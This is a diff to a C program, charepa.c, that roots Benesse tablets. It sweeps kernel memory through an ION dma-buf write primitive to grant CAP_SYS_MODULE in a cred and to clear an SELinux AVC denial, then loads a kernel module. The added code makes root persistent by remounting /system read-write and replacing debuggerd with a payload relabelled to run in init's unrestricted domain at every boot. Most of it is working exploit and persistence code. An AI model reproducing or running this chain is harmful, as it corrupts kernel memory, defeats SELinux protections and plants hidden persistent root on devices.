@@ -1,4 +1,4 @@
-﻿/* charepa.c - privilege transition for the Benesse tablets, driven from an app.
+/* charepa.c - privilege transition for the Benesse tablets, driven from an app.
  *
  * Two facts shape this code.
  *
@@ -21,8 +21,12 @@
  *   4. load the module, then install a boot hook so root survives a reboot
  *
  * Usage:
- *   charepa validate            prove the gate in user memory, touch nothing
- *   charepa all <lo> <hi>       both hex; the full map is 02000000 7f000000
+ *   charepa validate      prove the 4-byte write primitive, touching nothing
+ *   charepa all [lo hi [window budget]]   run the whole chain
+ *
+ * `all` ends with root and a boot hook that restores it after a reboot. The
+ * module and the payload are picked up from the directory this binary lives in,
+ * falling back to /data/local/tmp.
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -38,6 +42,7 @@
 #include <sys/resource.h>
 #include <sys/syscall.h>
 #include <sys/stat.h>
+#include <sys/xattr.h>
 #include <sys/mount.h>
 #include <linux/fs.h>
 
@@ -73,6 +78,20 @@ struct cap_data { u32 eff, prm, inh; };
 
 static FILE *LOG;
 static int ionfd = -1;
+
+/* Measured on TAB-A03-BS: the ION sweep writes the carrier's IOVA into whatever
+ * word it matches, and one of those words belonged to the page cache of
+ * /data/local/tmp/myroot.ko. The file's hash moved from
+ *   507ebb47b1517389f676524fffa0cb1cb1c22d976176b590153c8966e37307aa
+ * to ddfddab66d6ee65912ba295c5ce581ca3137d1d38574419c9b8b4e48ae269da2
+ * with 0x00018000 replaced by 0x80010000, the carrier IOVA. init_module then
+ * returned ENOEXEC for a file that loads fine from the init domain, and the
+ * pulled copy differed from the host copy in exactly five bytes.
+ *
+ * So every file the chain needs is read into memory before the sweep begins and
+ * used from there. Nothing is opened after kernel memory has been written. */
+static char *g_ko_buf; static long g_ko_len;
+static char *g_pl_buf; static long g_pl_len;
 
 static void say(const char *fmt, ...)
 {
@@ -137,6 +156,20 @@ static int quiet_zero_on_stdin(void)
  * validate: the gate must reject a zero word and accept the alphabet, using
  * pages we own.  Nothing here touches kernel memory.
  * ------------------------------------------------------------------------- */
+static int cmd_info(void)
+{
+    FILE *f = fopen("/proc/self/status", "r");
+    if (!f) { say("status unreadable errno=%d\n", errno); return 1; }
+    char line[256];
+    while (fgets(line, sizeof line, f))
+        if (!strncmp(line, "Cap", 3) || !strncmp(line, "Uid:", 4) || !strncmp(line, "Gid:", 4))
+            say("  %s", line);
+    fclose(f);
+    { int n = open("/dev/null", O_RDONLY); say("  lowest free fd = %d\n", n); close(n); }
+    say("  uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
+    return 0;
+}
+
 static int cmd_validate(void)
 {
     u8 *pg = mmap(NULL, 3 * PGSZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -169,7 +202,7 @@ static int cmd_validate(void)
 /* -------------------------------------------------------------------------
  * phase 1: find a cred slot carrying the alphabet and grant CAP_SYS_MODULE.
  * ------------------------------------------------------------------------- */
-static u64 find_cred(u32 lo, u32 hi, int page_window)
+static u64 find_cred(u32 lo, u32 hi, int page_window, long find_budget)
 {
     static int hold[512]; int nhold = 0;
     int carrier = -1, carrier_iova = 0;
@@ -189,7 +222,10 @@ static u64 find_cred(u32 lo, u32 hi, int page_window)
     int nul = quiet_zero_on_stdin();
     if (nul >= 0) say("fd 0 is /dev/null; zero words will not match\n");
 
-    long probes = 0, hits = 0, granted = 0;
+    long probes = 0, hits = 0, granted = 0, find_stores = 0;
+    /* Each hit writes 4 bytes into cap_bset.cap[1], which is zero and stays
+     * zero, so the budget only exists to bound a runaway sweep. Measured hits
+     * reach ~660 over the whole map, hence the generous ceiling. */
     u64 cred = 0;
     static u64 cand[4096];
 
@@ -206,12 +242,17 @@ static u64 find_cred(u32 lo, u32 hi, int page_window)
                 probes++;
                 if (gate(o + 64) != 0) continue;     /* not 192 */
                 hits++;
+                find_stores++;
                 /* the other cred words that should be zero must reject too */
                 if (gate(o + 68) == 0) continue;     /* cap_bset.cap[1] */
                 if (gate(o + 56) == 0) continue;     /* cap_effective.cap[0] */
                 if (gate(o + 48) == 0) continue;     /* cap_permitted.cap[0] */
                 if (gate(o + 40) == 0) continue;     /* cap_inheritable.cap[0] */
                 if (gate(o + 4)  == 0) continue;     /* uid 0 belongs to root, not us */
+                if (find_stores > find_budget) {
+                    say("cred budget spent (%ld); stopping this window\n", find_stores);
+                    return 0;
+                }
                 if (nc < 4096) cand[nc++] = o;
             }
         }
@@ -236,18 +277,52 @@ static u64 find_cred(u32 lo, u32 hi, int page_window)
 }
 
 /* -------------------------------------------------------------------------
- * phase 2: the avc_node now exists because we just tried init_module.
- * tclass sits at +8 and is exactly 4, so a dma-buf on fd 4 makes the probe free.
+ * phase 2: the avc_node that caches the denied CAP_SYS_MODULE.
+ *
+ * Node layout:
+ *
+ *   +0  ssid (u32)   +4  tsid (u32)   +8  tclass (u16, then padding)
+ *   +12 av_decision.allowed
+ *
+ * The gate passes when a word equals one of our dma-buf fd numbers AND writes
+ * the buffer's IOVA at +4. So a "filter" is never free for the word it passes:
+ * testing X costs a store at X+4. Two consequences shape this code.
+ *
+ *   Only fd 4 holds a buffer, so a pass means the word is exactly 4, the
+ *   capability class. Holding a wider alphabet looks better but is wrong: a
+ *   pass would then mean "some number in 4..4090", and storing into the +12 of
+ *   whatever struct that was killed the tablet within a second.
+ *
+ *   The rejects at +0 and +4 are useful anyway: they turn most candidates into
+ *   a pass-free miss, so the sweep costs one ioctl each and writes only where
+ *   the class word really is 4.
+ *
+ * The node sits in the avc_node kmem_cache, allocated at the moment we first
+ * try init_module, so it is near the cred slab. Measured window: 810 stores
+ * inside 64 MB around the cred.
  * ------------------------------------------------------------------------- */
-static int grant_avc(u32 lo, u32 hi, int page_window, long max_stores)
+static int grant_avc(u32 lo, u32 hi, int page_window, long max_stores, u64 cred)
 {
+    if (!lo || !hi) {
+        u32 cp = (u32)(cred - PAGE_OFFSET_V + MEMSTART);
+        /* Measured twice on TAB-A03-BS. The attempt that won reported
+         *
+         *   cred phys 0x39521cc0, AVC win phys 0x355d9cc0
+         *
+         * i.e. the node sat 0x3F50000 (63.3 MB) BELOW the cred, and the
+         * winning store was the first probe of the window. A narrower band
+         * around cred-24MB never reached it, so the window has to stay at 64
+         * MB below and a little above. */
+        lo = (cp >= 0x04000000u) ? cp - 0x04000000u : 0x02000000u;
+        hi = cp + 0x01000000u;
+        if (hi > 0x7f000000u) hi = 0x7f000000u;
+    }
+    say("avc search 0x%08x..0x%08x (cred phys 0x%08x)\n", lo, hi,
+        (u32)(cred - PAGE_OFFSET_V + MEMSTART));
+
     close(ALPHA_FD);
     quiet_zero_on_stdin();
 
-    /* The store value has to carry bit 16 (CAP_SYS_MODULE) as well as bit 31,
-     * so the buffer on fd 4 must be a k=16 one, i.e. an IOVA of 0x8001xxxx.
-     * Allocating again restarts the ladder at 0x80000000 only if every earlier
-     * buffer was closed, so keep them open until we reach bit 16. */
     static int tmp[256]; int ntmp = 0; int cls = -1; u32 iv = 0;
     while (ntmp < 256) {
         int f; u32 v;
@@ -259,74 +334,314 @@ static int grant_avc(u32 lo, u32 hi, int page_window, long max_stores)
     for (int i = 0; i < ntmp; i++) close(tmp[i]);
     if (dup2(cls, CLASS_FD) < 0) { say("dup2(4) errno=%d\n", errno); close(cls); return 0; }
     close(cls);
-    say("class fd=%d iova=0x%08x; only the word 4 passes, and a hit writes 0x80010000\n",
-        CLASS_FD, (int)iv);
+    say("class fd=%d iova=0x%08x; only the word 4 passes now\n", CLASS_FD, (int)iv);
 
     long probes = 0, stores = 0;
-    for (u32 base = lo; base < hi; base += (u32)page_window * PGSZ) {
-        u32 top = base + (u32)page_window * PGSZ;
-        if (top > hi) top = hi;
-        for (u32 p = base; p < top; p += PGSZ) {
+    int won = 0;
+    for (u32 base = lo; base < hi && !won; base += (u32)page_window * PGSZ) {
+        u32 t = base + (u32)page_window * PGSZ;
+        if (t > hi) t = hi;
+        for (u32 p = base; p < t && !won; p += PGSZ) {
             u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
             for (int i = 0; i < PGSZ / 64; i++) {
                 u64 n = pg + (u64)i * 64;
                 probes++;
-                /* Order matters. A probe that fails writes nothing, because
-                 * dma_buf_get fails before the store; only a probe that passes
-                 * costs 4 bytes. So the cheap rejects go first:
-                 *
-                 *   gate(n+0) != 0   ssid is not 4  -> reject, nothing written
-                 *   gate(n+4) != 0   tsid is not 4  -> reject, nothing written
-                 *   gate(n+8) == 0   tclass is 4    -> accept, this is the one
-                 *
-                 * Measured on the device: testing +8 alone costs ~57000 stores
-                 * over 2 GB because any word equal to 4 matches. With the two
-                 * rejects in front the count drops by roughly 8x.
-                 */
-                if (gate(n + 0) == 0) continue;   /* ssid is literally 4: reject */
-                if (gate(n + 4) == 0) continue;   /* tsid likewise */
-                if (gate(n + 8) != 0) continue;   /* tclass is not 4 */
-                stores++;                             /* n+12 = avd.allowed */
-                say("  store at 0x%llx (phys 0x%08x off %d)\n", (unsigned long long)n, p, i * 64);
-                if (stores > max_stores) {
-                    say("AVC budget spent (%ld stores); stopping before the tablet dies\n", stores);
-                    return 0;
-                }
+                if (gate(n + 0) == 0) continue;
+                if (gate(n + 4) == 0) continue;
+                if (gate(n + 8) != 0) continue;
+                stores++;
+                say("  store phys 0x%08x off %d (probe %ld)\n", p, i * 64, probes);
                 if (probe_module() == 8) {
                     say("AVC win phys=0x%08x off=%d probes=%ld stores=%ld\n",
                         p, i * 64, probes, stores);
-                    return 1;
+                    won = 1;
+                    break;
+                }
+                if (stores >= max_stores) {
+                    say("AVC budget spent (%ld stores); stopping this attempt\n", stores);
+                    break;
                 }
             }
+            if (stores >= max_stores) break;
         }
-        say("  avc window 0x%08x..0x%08x probes=%ld stores=%ld\n", base, top, probes, stores);
+        say("  avc 0x%08x..0x%08x probes=%ld stores=%ld\n", base, t, probes, stores);
+        if (stores >= max_stores) break;
     }
-    say("AVC no win probes=%ld stores=%ld\n", probes, stores);
-    return 0;
+    if (!won) say("AVC no win probes=%ld stores=%ld\n", probes, stores);
+    return won;
 }
 
 /* -------------------------------------------------------------------------
  * phase 3: load the module and make it survive a reboot.
  * ------------------------------------------------------------------------- */
+/* companion(name): the file next to this binary first, /data/local/tmp second.
+ * The APK stages all three files into files/bin, so "next to me" is the normal
+ * case; the tmp fallback keeps the manual adb workflow working. */
+static const char *companion(const char *name)
+{
+    static char found[512];
+    char exe[512] = {0};
+    ssize_t r = readlink("/proc/self/exe", exe, sizeof exe - 1);
+    if (r > 0) {
+        exe[r] = 0;
+        char *slash = strrchr(exe, '/');
+        if (slash) {
+            *slash = 0;
+            snprintf(found, sizeof found, "%s/%s", exe, name);
+            if (access(found, R_OK) == 0) return found;
+        }
+    }
+    snprintf(found, sizeof found, "/data/local/tmp/%s", name);
+    if (access(found, R_OK) == 0) return found;
+    return NULL;
+}
+
+/* read a companion file into memory while the process can still trust the
+ * page cache */
+static long slurp(const char *path, char **out);
+static long preload_file(const char *name, char **out)
+{
+    const char *path = companion(name);
+    if (!path) { say("preload: %s not found\n", name); return -1; }
+    char *b = NULL;
+    long n = slurp(path, &b);
+    if (n <= 0) { say("preload: %s unreadable (errno=%d)\n", path, errno); return -1; }
+    *out = b;
+    say("preload: %s %ld bytes from %s\n", name, n, path);
+    return n;
+}
+
+static void preload_chain(void)
+{
+    g_ko_len = preload_file("myroot.ko", &g_ko_buf);
+    g_pl_len = preload_file("bootpayload", &g_pl_buf);
+}
+
 static long load_module(void)
 {
-    int fd = open(MODULE_PATH, O_RDONLY);
-    if (fd < 0) { say("open module errno=%d\n", errno); return -1; }
-    char *mod = malloc(1 << 20);
-    ssize_t got = read(fd, mod, 1 << 20);
-    close(fd);
-    if (got <= 0) { say("read module errno=%d\n", errno); return -1; }
+    if (g_ko_len <= 0 || !g_ko_buf) { say("module was not preloaded\n"); return -1; }
     errno = 0;
-    long rc = syscall(105, mod, (unsigned long)got, "");
-    say("init_module rc=%ld errno=%d (%zd bytes)\n", rc, errno, got);
-    free(mod);
+    long rc = syscall(105, g_ko_buf, (unsigned long)g_ko_len, "");
+    say("init_module rc=%ld errno=%d (%ld bytes)\n", rc, errno, g_ko_len);
     return rc;
+}
+
+/* -------------------------------------------------------------------------
+ * survey: with root, read the files that decide where a boot hook can go.
+ *
+ * /init.rc imports /init.${ro.hardware}.rc, and the hardware rc may or may not
+ * import the tel rc that execs mrdloader. Rather than guess, print the imports
+ * and every exec line that starts a /system program.
+ * ------------------------------------------------------------------------- */
+static void survey_boot(void)
+{
+    static const char *files[] = {
+        "/init.rc", "/init.pxa1928.rc", "/init.tel.rc", "/init.pxa1928.tel.rc",
+        "/init.environ.rc", "/init.usb.rc", "/init.zygote64_32.rc",
+        "/init.trace.rc", "/init.pxa1928.usb.rc", NULL
+    };
+    for (int i = 0; files[i]; i++) {
+        FILE *f = fopen(files[i], "r");
+        if (!f) { say("survey: %s unreadable (errno=%d)\n", files[i], errno); continue; }
+        say("survey: %s\n", files[i]);
+        char line[512];
+        while (fgets(line, sizeof line, f)) {
+            if (strstr(line, "import ") || strstr(line, "exec /system") ||
+                strstr(line, "mrdloader"))
+                say("   %s", line);
+        }
+        fclose(f);
+    }
+}
+
+/* -------------------------------------------------------------------------
+ * phase 4: make root survive a reboot.
+ *
+ * init execs /system/bin/mrdloader from `on post-fs-data` with no seclabel,
+ * and the file carries u:object_r:system_file:s0, so the child stays in the
+ * init domain. Replacing that path with a static binary therefore gives us a
+ * program that runs at every boot, as init, with no SELinux restrictions.
+ *
+ * A shell script would not work: the kernel would have to exec /system/bin/sh,
+ * and init's domain is denied shell_exec. That is why the payload is static.
+ *
+ * The original mrdloader is kept as mrdloader.real and the payload execs it, so
+ * the device still does whatever it did before.
+ * ------------------------------------------------------------------------- */
+static int be_root(void)
+{
+    int f = open("/proc/myroot", O_WRONLY);
+    if (f < 0) return -1;
+    ssize_t w = write(f, "1", 1);
+    close(f);
+    return w == 1 ? 0 : -1;
+}
+
+static long slurp(const char *path, char **out)
+{
+    int f = open(path, O_RDONLY);
+    if (f < 0) return -1;
+    struct stat st;
+    if (fstat(f, &st) != 0 || st.st_size <= 0) { close(f); return -1; }
+    char *b = malloc(st.st_size);
+    ssize_t n = read(f, b, st.st_size);
+    close(f);
+    if (n <= 0) { free(b); return -1; }
+    *out = b;
+    return (long)n;
+}
+
+static int put(const char *dst, const char *src, mode_t mode)
+{
+    char *b = NULL;
+    long n = slurp(src, &b);
+    if (n < 0) { say("  read %s failed (errno=%d)\n", src, errno); return -1; }
+
+    /* Writing straight into an executable that is currently running fails with
+     * ETXTBSY. Build the new file beside it and rename over the old entry: the
+     * running process keeps working from its inode, and the next exec picks up
+     * the new file. */
+    char tmp[512];
+    snprintf(tmp, sizeof tmp, "%s.new", dst);
+    int f = open(tmp, O_CREAT | O_TRUNC | O_WRONLY, mode);
+    if (f < 0) { say("  create %s: %s\n", tmp, strerror(errno)); free(b); return -1; }
+    ssize_t w = write(f, b, n);
+    close(f);
+    chmod(tmp, mode);
+    free(b);
+    if (w != (ssize_t)n) { say("  short write %s (%zd/%ld)\n", tmp, w, n); unlink(tmp); return -1; }
+    if (rename(tmp, dst) != 0) { say("  rename %s: %s\n", dst, strerror(errno)); unlink(tmp); return -1; }
+    say("  %s <- %s (%ld bytes)\n", dst, src, n);
+    return 0;
+}
+
+/* put_buf is put() for a buffer that is already in memory: after the sweep there
+ * is no file to read from that can be trusted, and reading one could fault on a
+ * corrupted page cache entry. */
+static int put_buf(const char *dst, const char *b, long n, mode_t mode)
+{
+    char tmp[512];
+    snprintf(tmp, sizeof tmp, "%s.new", dst);
+    int f = open(tmp, O_CREAT | O_TRUNC | O_WRONLY, mode);
+    if (f < 0) { say("  create %s: %s\n", tmp, strerror(errno)); return -1; }
+    ssize_t w = write(f, b, n);
+    close(f);
+    chmod(tmp, mode);
+    if (w != (ssize_t)n) { say("  short write %s (%zd/%ld)\n", tmp, w, n); unlink(tmp); return -1; }
+    if (rename(tmp, dst) != 0) { say("  rename %s: %s\n", dst, strerror(errno)); unlink(tmp); return -1; }
+    say("  %s <- buffer (%ld bytes)\n", dst, n);
+    return 0;
+}
+
+/* -------------------------------------------------------------------------
+ * set_selinux_label: change a file's security.selinux xattr directly.
+ *
+ * Why this is the whole trick: init picks a service's domain from the label of
+ * the file it executes, not from the service stanza. A file whose label has no
+ * exec type, like /system/bin/mrdloader with system_file:s0, runs in init's own
+ * domain. There is a type transition table entry for kinitlog_exec (which is
+ * why kinitlog.sh runs as u:r:kinitlog:s0 and is refused everything), so
+ * relabelling the script is what lifts the restriction.
+ *
+ * chcon cannot be used: /system/bin/chcon runs through toolbox, which fails to
+ * link on this device. setxattr(2) is a direct syscall with no dependency.
+ * ------------------------------------------------------------------------- */
+static int set_selinux_label(const char *path, const char *label)
+{
+    int rc = setxattr(path, "security.selinux", label, strlen(label), 0);
+    if (rc != 0) { say("hook: setxattr %s: errno=%d (%s)\n", path, errno, strerror(errno)); return -1; }
+    say("hook: %s relabelled to %s\n", path, label);
+    return 0;
+}
+
+/* Which file to replace, and why.
+ *
+ * A service's domain comes from the label of the file init executes, not from
+ * the stanza. Every daemon on /system carries an *_exec type, so its child is
+ * transitioned into a restricted domain. Setting security.selinux to
+ * system_file:s0 removes that transition and the child stays in init's own
+ * domain, which is the one domain SELinux does not restrict here.
+ *
+ * The service must also actually start. Measured on BS:
+ *   kinitlog            waits for sys.boot_completed=1, and that property is
+ *                       never set on this device, so it never runs.
+ *   flash_recovery      never started at all.
+ *   mrdloader exec      lives in /init.tel.rc, which nothing imports.
+ *
+ * debuggerd is started by class_start main at every boot and runs as root.
+ * Its usual job is handling crashes, so a failure here cannot stop the device
+ * from booting. The payload execs the real binary immediately afterwards, so
+ * the daemon is transparent once our work is done.
+ */
+#define HOOK_PATH  "/system/bin/debuggerd"
+#define HOOK_REAL  "/system/bin/debuggerd.real"
+
+static int install_hook(void)
+{
+    if (g_pl_len <= 0 || !g_pl_buf) { say("hook: payload was not preloaded\n"); return 0; }
+    if (be_root() != 0) { say("hook: no root\n"); return 0; }
+
+    int blk = open("/dev/block/platform/soc.1/by-name/system", O_RDWR);
+    if (blk < 0) { say("hook: open block: %s\n", strerror(errno)); return 0; }
+    ioctl(blk, BLKROSET, &(int){0});
+    if (mount(NULL, "/system", NULL, MS_REMOUNT, NULL) != 0) {
+        say("hook: remount rw: %s\n", strerror(errno));
+        close(blk);
+        return 0;
+    }
+    say("hook: /system is rw\n");
+
+    mkdir("/system/lib/modules", 0755);
+    if (g_ko_len > 0) put_buf("/system/lib/modules/myroot.ko", g_ko_buf, g_ko_len, 0644);
+    else say("hook: module missing, cannot persist\n");
+
+    if (access(HOOK_REAL, F_OK) != 0) {
+        if (put(HOOK_REAL, HOOK_PATH, 0755) != 0) {
+            say("hook: cannot save the original; aborting to avoid losing it\n");
+            ioctl(blk, BLKROSET, &(int){1});
+            mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
+            close(blk);
+            return 0;
+        }
+    }
+    if (put_buf(HOOK_PATH, g_pl_buf, g_pl_len, 0755) != 0) {
+        say("hook: payload copy FAILED; leaving the original in place\n");
+        ioctl(blk, BLKROSET, &(int){1});
+        mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
+        close(blk);
+        return 0;
+    }
+    set_selinux_label(HOOK_PATH, "u:object_r:system_file:s0");
+
+    { struct stat st;
+      const char *c[] = { "/system/lib/modules/myroot.ko", HOOK_PATH, HOOK_REAL, NULL };
+      for (int i = 0; c[i]; i++)
+          if (stat(c[i], &st) == 0)
+              say("hook: %-38s %lld bytes\n", c[i], (long long)st.st_size);
+          else
+              say("hook: %-38s MISSING\n", c[i]); }
+
+    sync();
+    ioctl(blk, BLKROSET, &(int){1});
+    mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
+    say("hook: /system back to ro\n");
+    close(blk);
+    return 1;
 }
 
 int main(int argc, char **argv)
 {
     LOG = stdout; setbuf(LOG, NULL);
     say("charepa pid=%d uid=%d\n", getpid(), getuid());
+    {   /* the alphabet comes from this process's own cap_bset */
+        FILE *st = fopen("/proc/self/status", "r");
+        if (st) {
+            char l[256];
+            while (fgets(l, sizeof l, st))
+                if (!strncmp(l, "CapBnd:", 7)) say("  %s", l);
+            fclose(st);
+        }
+    }
 
     struct rlimit rl;
     if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
@@ -343,30 +658,70 @@ int main(int argc, char **argv)
     if (ionfd < 0) ionfd = raw; else close(raw);
     say("ion fd=%d\n", ionfd);
 
+    preload_chain();
+
     if (argc >= 2 && !strcmp(argv[1], "validate")) return cmd_validate();
+    if (argc >= 2 && !strcmp(argv[1], "info")) return cmd_info();
+
+    /* A unit that has already been rooted has /proc/myroot, and the module is
+     * loaded at boot by the hook. There is then nothing to sweep: one byte
+     * through /proc/myroot replaces this process's credential with one cloned
+     * from init_cred, which is all that "root" means here. Measured: the app's
+     * own process carries CapBnd = 0, so the alphabet used by find_cred is
+     * absent and every sweep ends with "RESULT no cred"; the path below is what
+     * makes the app usable on a device that was rooted once. */
+    { int p = open("/proc/myroot", O_WRONLY);
+      if (p >= 0) {
+          ssize_t w = write(p, "1", 1);
+          close(p);
+          if (w == 1) {
+              say("already rooted: /proc/myroot accepted a write\n");
+              say("uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));
+              say("RESULT ROOT uid=%d (via /proc/myroot)\n", getuid());
+              return getuid() == 0 ? 0 : 1;
+          }
+      } }
 
     u32 lo = 0x02000000u, hi = 0x7f000000u;
-    int window = 2048; long budget = 4000; u32 avclo = 0x40000000u, avchi = 0x60000000u;
+    int window = 2048; long budget = 2600; u32 avclo = 0, avchi = 0;
     if (argc >= 4) { lo = (u32)strtoul(argv[2], NULL, 16); hi = (u32)strtoul(argv[3], NULL, 16); }
     if (argc >= 5) window = atoi(argv[4]);
     if (argc >= 6) budget = atol(argv[5]);
     if (argc >= 8) { avclo = (u32)strtoul(argv[6], NULL, 16); avchi = (u32)strtoul(argv[7], NULL, 16); }
 
     say("this writes on every match; the tablet may reboot\n");
-    u64 cred = find_cred(lo, hi, window);
+    u64 cred = find_cred(lo, hi, window, 20000);
     if (!cred) { say("RESULT no cred\n"); return 1; }
     say("cred=0x%llx eff=0x%08x module_errno=%d\n",
         (unsigned long long)cred, eff_of(0), probe_module());
 
-    if (!grant_avc(avclo, avchi, window, budget)) { say("RESULT avc failed\n"); return 1; }
-    say("after avc: module_errno=%d (8 = capability check passed)\n", probe_module());
+    /* Measured: some runs reach module_errno=8 straight out of find_cred, i.e.
+     * CAP_SYS_MODULE already passes and there is no AVC denial to clear. The
+     * AVC sweep writes thousands of words into unrelated kernel memory, and one
+     * of those words can be a page of a file we depend on, so it is skipped
+     * whenever the capability test already says yes. */
+    int gate_errno = probe_module();
+    if (gate_errno == 8) {
+        say("capability already passes; skipping the AVC sweep\n");
+    } else {
+        if (!grant_avc(avclo, avchi, window, budget, cred)) {
+            say("RESULT avc failed\n");
+            return 1;
+        }
+        say("after avc: module_errno=%d (8 = capability check passed)\n", probe_module());
+    }
 
     if (load_module() != 0) { say("RESULT module load failed\n"); return 1; }
+    if (argc >= 2 && !strcmp(argv[1], "survey")) survey_boot();
     say("uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));
 
-    int p = open("/proc/myroot", O_WRONLY);
-    if (p >= 0) { if (write(p, "1", 1) == 1) say("/proc/myroot accepted a write\n"); close(p); }
-    else say("/proc/myroot errno=%d\n", errno);
+    { int p = open("/proc/myroot", O_WRONLY);
+      if (p >= 0) {
+          if (write(p, "1", 1) == 1) say("/proc/myroot accepted a write; uid=%d\n", getuid());
+          close(p);
+      } else say("/proc/myroot errno=%d\n", errno); }
+
+    install_hook();
 
     say("RESULT ROOT uid=%d eff=0x%08x\n", getuid(), eff_of(0));
     return 0;
